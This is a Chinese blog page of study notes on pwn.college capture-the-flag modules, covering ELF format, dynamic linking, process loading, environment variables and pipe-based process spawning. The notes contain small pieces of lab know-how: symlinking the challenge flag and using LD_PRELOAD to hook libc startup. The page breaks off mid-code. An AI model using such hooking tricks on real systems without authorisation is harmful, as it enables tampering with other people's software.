

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Yogdzewa">
  <meta name="keywords" content="">
  
    <meta name="description" content="冲">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn modules的一点笔记">
<meta property="og:url" content="https://yogdzewa.github.io/2022-01/Now-pwn-modules/index.html">
<meta property="og:site_name" content="Yogdzewa">
<meta property="og:description" content="冲">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/photo_2018-01-13_11-28-32.jpg">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220503162403150.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220430102917561.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220426223702228.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220507102703295.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505210342026.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220506101348091.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220506104816965.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220507162940280.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220508231821229.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505165437735.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220511235547367.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220516162810899.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220516163018313.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515153055539.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515153138069.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515155725438.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220512222315120.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220519155802133.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220523182826589.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220524205647223.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220524211101441.png">
<meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
<meta property="article:modified_time" content="2022-05-30T07:36:38.623Z">
<meta property="article:author" content="Yogdzewa">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
  
  
  <title>pwn modules的一点笔记 - Yogdzewa</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/obsidian.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"yogdzewa.github.io","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>(￣.￣)</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/image/edit2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="pwn modules的一点笔记">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-01-16 22:00" pubdate>
        2022年1月16日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      101k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      1262 分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">pwn modules的一点笔记</h1>
            
              <p class="note note-info">
                
                  不可视境界线最后变动于：2022年5月30日 下午
                
              </p>
            
            <div class="markdown-body">
              <ul>
<li><p>连接</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh -i ~/pwn.college/pwnkey hacker@dojo.pwn.college <br></code></pre></div></td></tr></table></figure></li>
<li><p>传文件到dojo或拉取</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i ~/pwn.college/pwnkey [文件] hacker@dojo.pwn.college:<br>scp -i ~/pwn.college/pwnkey hacker@dojo.pwn.college:[文件] ./<br></code></pre></div></td></tr></table></figure></li>
<li><p><strong>可以创建flag的符号链接, 不过除了$HOME其他目录均不能写, 只能在<code>~/</code>下.</strong> </p>
</li>
</ul>
<h1 id="module-1-communication"><a href="#module-1-communication" class="headerlink" title="module 1-communication"></a>module 1-communication</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" srcset="/img/loading.gif" lazyload alt="image-20220117165401525"></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ln -s /old/path /new/path<br>&lt;in_file:      redirect in_file into the command&#x27;s input<br><span class="hljs-meta">&gt;</span><span class="bash">out_file:     redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s output into out_file, overwriting it</span></span><br><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-string">&gt;out_file:    redirect the command&#x27;</span>s output into out_file, appending to it</span><br><span class="hljs-meta">2&gt;</span><span class="bash">error_file:  redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s errors into error_file, overwriting it</span></span><br><span class="hljs-meta">2&gt;</span><span class="bash"><span class="hljs-string">&gt;error_file: redirect the command&#x27;</span>s errors into error_file, appending to it</span><br></code></pre></div></td></tr></table></figure>

<h2 id="Binary-files"><a href="#Binary-files" class="headerlink" title="Binary files"></a>Binary files</h2><blockquote>
<p>pwn.college的教程还是挺绝的, slide可以做为基础知识的详细参考资料. Binaryfiles的slide在<a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1wrX8tvwaxIEk5hx4OtQmPqps-MScIaDO-9bTKQqr8vI/edit#slide=id.g9265d66f8d_0_26">这里</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">ELF base struct: header-sections-segments</a><br><a target="_blank" rel="noopener" href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/">symbols</a><br><a target="_blank" rel="noopener" href="https://www.intezer.com/blog/elf/executable-and-linkable-format-101-part-3-relocations/">relocations</a><br><a target="_blank" rel="noopener" href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-4-dynamic-linking/">dynamic-linking</a> </p>
</blockquote>
<ul>
<li>ELF is a binary file format.<br>  Contains the program and its data.Describes how the program should be loaded (<em>program/segment headers</em>).Contains metadata describing program components (<em>section headers</em>).</li>
<li><strong>sections</strong> gather all needed information to link a given object file and build an executable,<br>  while <strong>Program Headers</strong> split the executable into segments with different attributes, which will eventually be loaded into memory.</li>
<li>Section headers are <em><strong>not</strong></em> a necessary part of the ELF. <em>Section headers</em> are just <strong>metadata</strong>.</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file /bin/cat</span> <br>/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e6afa43e1e280bd06c018f541c7ae46a2ebda83c, for GNU/Linux 3.2.0, stripped<br></code></pre></div></td></tr></table></figure>

<ul>
<li>Several ways to dig in: 在CSAPP里, 当初看的时候被我忽略掉了…<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>gcc</strong> to make your ELF.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>readelf</strong> to parse the ELF header.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>objdump</strong> to parse the ELF header and disassemble the source code.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>nm</strong> to view your ELF’s symbols.</li>
<li><input disabled="" type="checkbox"> <strong>patchelf</strong> to change some ELF properties.</li>
<li><input checked="" disabled="" type="checkbox"> <strong>objcopy</strong> to swap out ELF sections.</li>
<li><input disabled="" type="checkbox"> <strong>strip</strong> to remove otherwise-helpful information (such as symbols).</li>
<li><input disabled="" type="checkbox"> <a target="_blank" rel="noopener" href="https://ide.kaitai.io/"><strong>kaitai struct</strong></a> to look through your ELF interactively</li>
</ul>
</li>
</ul>
<h3 id="ELF-base-struct"><a href="#ELF-base-struct" class="headerlink" title="ELF base struct"></a>ELF base struct</h3><p>ELF files are composed of three major components:</p>
<ul>
<li><strong>ELF Header</strong> : contains general information about the binary <code>readelf -h &lt;executable&gt;</code> </li>
<li><strong>Sections</strong> : comprise all information needed for linking a target object file in order to build a working executable <code>readelf -S &lt;executable&gt;</code></li>
<li><strong>Segments</strong> : break down the structure of an ELF binary into suitable chunks to prepare the executable to be loaded into memory</li>
</ul>
<blockquote>
<p>每个section的意义还是要注意一下, 我又倒回来看.got.plt了</p>
</blockquote>
<p>注意segment在链接的时候没有作用, section在运行时没有作用.</p>
<p>一方面Segment通过把section分组来提高装载的效率, 另一方面要注意必须和物理页大小对齐, 以便于pte中的权限控制.</p>
<h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><p><strong>Provide interface to Linkers and Debuggers to enforce their functionality.</strong> </p>
<p>.dynstr是.dynsym的string table, The section <em>.strtab</em> is the <em>String Table</em> of <em>.symtab Symbol Table</em>. 而且string table的entry数量和symbol table的entry数量一致.</p>
<p><img src="../../image/pwn-modules/photo_2018-01-13_11-28-32.jpg" srcset="/img/loading.gif" lazyload></p>
<h3 id="relocation"><a href="#relocation" class="headerlink" title="relocation"></a>relocation</h3><ol>
<li><strong>Defining Relocations</strong> </li>
</ol>
<p>There are different types of <u>relocatable files</u>:</p>
<ul>
<li>Generic object files (*.o).     比较简单, 就是一个静态链接的文件.</li>
<li>Kernel object files (*.ko).     wait for future</li>
<li>Shared object files (*.so).    <ul>
<li>These type of relocatable files support being linked on runtime, and they may be shared across different processes. Consequently, relocations of dynamic dependencies have to be done at runtime. This process is known as Dynamic Linking.</li>
</ul>
</li>
</ul>
<p>Elfxx_Rel and Elfxx_Rela差在一个Addend上, 也就是要重定位的位置和下一条指令地址的差值<strong>取反</strong>.</p>
<p>其他的部分看原博客<a target="_blank" rel="noopener" href="https://www.intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/">就行</a>, 东西太多必须每一段意思都要懂, 不过重定位条目比较少也容易记住.</p>
<h3 id="Dynamic-Linking"><a href="#Dynamic-Linking" class="headerlink" title="Dynamic Linking"></a>Dynamic Linking</h3><h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>Unlike in static linking, <em><strong>ld</strong></em> requires shared libraries to create a dynamically linked executable.<br>The output file will contain the <strong>executable’s code</strong> and <strong>the names of the shared libraries</strong> required.</p>
<p>When the binary is executed, the dynamic linker will find the required dependencies to <strong>load</strong> and link them together.</p>
<h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>The dynamic linking process begins immediately after execution.</p>
<p>With dynamically linked programs, the system executes the file’s “<strong>interpreter</strong>”, which is an <u>intermediate</u> program that should <strong>set up the environment and only then execute the main binary</strong>. The interpreter lies in the <em>PT_INTERP</em> segment created by the compile-time linker (<em><strong>ld</strong></em>).</p>
<p>The dynamic linker will <strong>set up the environment</strong> <u>using dynamic entries</u> from the <em>.dynamic</em> section:</p>
<p>preparing the environment:</p>
<ol>
<li>Load the original file’s PT_LOAD segments in memory.</li>
<li>Use the <em>.dynamic</em> section/segment to read dependencies, search for them on disk and load them in memory as well. This is done recursively for dependent libraries—they can be dynamically linked as well. The dependency searching algorithm is outlined in the <a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so man page</a>.</li>
<li>Perform relocations – shared libraries are loaded into non-deterministic addresses and must have absolute addresses patched, as well as resolving references to other object files.</li>
<li>Invoke shared library initialization functions (registered in the <em>.preinit_array, .init, .init_array</em> sections). <strong>What happened?</strong> </li>
<li>Finally, pass control back to the original binary’s entry point, making it seem to the binary that control was passed directly from <em>exec</em>.</li>
</ol>
<p>还讲到了<strong>LD_PRELOAD</strong>和<strong>LD_LIBRARY_PATH</strong>变量…还是看原文吧…</p>
<h4 id="Lazy-Linking"><a href="#Lazy-Linking" class="headerlink" title="Lazy Linking"></a>Lazy Linking</h4><p>lazy linking的原因是如果一个程序开头出错了马上退出, rendering useless all of the relocation work performed by the dynamic linker, 所以将一些链接工作放到实际调用的时候.</p>
<p>在CSAPP中看过了, 基本相同, 不同在于提供了IDA的视图看法.</p>
<h2 id="Process-Loading"><a href="#Process-Loading" class="headerlink" title="Process Loading"></a>Process Loading</h2><ol>
<li><p>A process is created.</p>
<p> by fork() or clone() and execve().</p>
</li>
<li><p>Cat is loaded.</p>
<ul>
<li><p>must be executable</p>
<p>To figure out what to load, the Linux kernel reads the beginning of the file (i.e., /bin/cat), and makes a decision:</p>
</li>
<li><p>If the file starts with <strong>#!</strong>, the kernel extracts the interpreter from the rest of that line and executes this interpreter with the original file as an argument.</p>
</li>
<li><p>If the file matches a format in <strong>/proc/sys/fs/binfmt_misc</strong>, the kernel executes the interpreter specified for that format with the original file as an argument.</p>
</li>
<li><p>If the file is a <strong>dynamically-linked</strong> ELF, the kernel reads the interpreter/loader defined in the ELF, loads the interpreter and the original file, and lets the interpreter take control.</p>
</li>
<li><p>If the file is a <strong>statically-linked</strong> ELF, the kernel will load it.Other legacy file formats are checked for</p>
<p>notice the interpreter specified in .interp section.</p>
<p><strong>Dynamically linked ELFs: the loading process</strong> </p>
</li>
<li><p>The program and its interpreter are <u>loaded by the kernel</u>.</p>
</li>
<li><p>The interpreter <u>locates the libraries</u>.<br>  a. LD_PRELOAD environment variable, and anything in /etc/ld.so.preload<br>  b. LD_LIBRARY_PATH environment variable (can be set in the shell)<br>  c. DT_RUNPATH or DT_RPATH specified in the binary file (both can be modified with patchelf)<br>  d.system-wide configuration (/etc/ld.so.conf)<br>  e. /lib and /usr/lib</p>
</li>
<li><p>The interpreter <u>loads the libraries</u>.<br>  a.  these libraries can depend on other libraries, causing more to be loadedb.relocations updated</p>
</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1TwM5WLWnTqrNkpXjGKkaXYbKZEpatEQYA7ckBVXAOhs/edit#slide=id.g40953d030c_0_179">Cat is initialized</a>.</p>
<p> <strong>/proc/self/maps</strong> and <strong>attribute((constructor))</strong> </p>
</li>
</ol>
<p>Further readings:</p>
<p><a target="_blank" rel="noopener" href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html">How does the Linux kernel run a program</a> </p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/CMCDragonkai/10ab53654b2aa6ce55c11cfc5b2432a4">Linux: Understanding the Memory Layout of Linux Executables</a> </p>
<h2 id="Process-Execution"><a href="#Process-Execution" class="headerlink" title="Process Execution"></a>Process Execution</h2><p>用命令行演示了非常多的内容, 基本都没见过我尽量记录下一些细节. <a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1ezY9Q8I0tzDD-7ZDXMbQM5RQ7z1dvB9-U_nDEhc6qdE/edit#slide=id.g9279416eed_1_114">谷歌文档</a> </p>
<ol>
<li>Cat is launched.</li>
<li>Cat reads its arguments and environment.</li>
<li>Cat does its thing.</li>
<li>Cat terminates. </li>
</ol>
<p>上面四个是这一部分要考虑的流程, 我也按流程走:</p>
<h3 id="Cat-is-launched"><a href="#Cat-is-launched" class="headerlink" title="Cat is launched"></a>Cat is launched</h3><p><code>__libc_start_main()</code>, 又是这个函数, 不过在这之前还有一个<code>_start()</code>, 形成<code>_start()-&gt;__libc_start_main()-&gt;main()</code>流程.</p>
<blockquote>
<p>可以指定一下LD_PRELOAD参数来改变__libc_start_main()之类的操作</p>
</blockquote>
<h3 id="Cat-reads-arg-amp-env"><a href="#Cat-reads-arg-amp-env" class="headerlink" title="Cat reads arg &amp; env"></a>Cat reads arg &amp; env</h3><p>在下一节中有介绍, 视频里示范了一个改环境变量的例子.</p>
<p>在执行ls指令的时候 添加<code>LANG = C</code>环境变量, 会导致排序按照ASCII码, 否则会按照系统默认的<code>en_US-UTF-8</code> </p>
<h3 id="Cat-does-thing"><a href="#Cat-does-thing" class="headerlink" title="Cat does thing"></a>Cat does thing</h3><p>讲到了库函数, 系统调用, 信号, 共享内存. </p>
<p>通过nm指令来查看symbol, strace的使用, 以及libc库函数可以不用写头文件, 不过会引起一个隐式声明警告, 可以通过man来查看需要引用什么头文件. </p>
<p>信号演示的时候用了<code>ps pgrep</code>两个指令, 看ps的manual知道了参数有三种风格. 共享内存演示了/dev/shm, <strong>还不知道这怎么用</strong> </p>
<p>还有一个进程terminate, 和我在操作系统中看到的一致, 不重复了.</p>
<p>剩下的在PPT里.</p>
<h2 id="命令行参数和环境变量"><a href="#命令行参数和环境变量" class="headerlink" title="命令行参数和环境变量"></a>命令行参数和环境变量</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br></code></pre></div></td></tr></table></figure>

<p>main函数的参数, 其中argv和envp是字符串数组的指针, 所以是二重指针, 两个数组的最后一个元素是null.</p>
<p>就像这样子:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -o <span class="hljs-built_in">test</span> test.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./<span class="hljs-built_in">test</span> testing</span><br>The number of arguments is: 2<br><br>First arg:     The program name is: ./test<br>Second arg: The first argument is: testing<br><br>The first environment variable is: PWD=/home/yans # process working directory<br>The second environment variable is: SHLVL=1<br></code></pre></div></td></tr></table></figure>

<p><code>env</code> runs a command with a modified environment. 也可以设置特定的环境变量.</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> env -i ./countenv</span>                   <br>There are 0 environment variables.<br></code></pre></div></td></tr></table></figure>

<h2 id="PIPE"><a href="#PIPE" class="headerlink" title="PIPE"></a>PIPE</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> &#123;</span><br>    <span class="hljs-keyword">int</span> pid;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdin</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdout</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stderr</span>;<br>&#125;;<br><span class="hljs-keyword">void</span> __close(<span class="hljs-keyword">int</span> fd) &#123;<br>    <span class="hljs-keyword">if</span> (close(fd) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not close pipe end&quot;</span> ); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mk_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fds[<span class="hljs-number">2</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(fds) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not create pipe&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mv_fd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dup2(fd1,  fd2) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not duplicate pipe end&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>    __close(fd1);<br>&#125;<br><br><span class="hljs-comment">// Start program at argv[0] with arguments argv.</span><br><span class="hljs-comment">// Set up new stdin, stdout and stderr.</span><br><span class="hljs-comment">// Puts references to new process and pipes into `p`.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">call</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* argv[], struct subprocess * p)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> child_in[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_out[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_err[<span class="hljs-number">2</span>];<br>    pipe(child_in); pipe(child_out); pipe(child_err);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        __close(<span class="hljs-number">0</span>); __close(<span class="hljs-number">1</span>); __close(<span class="hljs-number">2</span>);                                 <span class="hljs-comment">// __close parent pipes</span><br>        __close(child_in[<span class="hljs-number">1</span>]); __close(child_out[<span class="hljs-number">0</span>]); __close(child_err[<span class="hljs-number">0</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        mv_fd(child_in[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>); mv_fd(child_out[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); mv_fd(child_err[<span class="hljs-number">1</span>], <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">char</span>* envp[] = &#123; <span class="hljs-string">&quot;\0&quot;</span> &#125;;<br>        <span class="hljs-comment">//write(1,&quot;what the fuck&quot;, 30);</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span 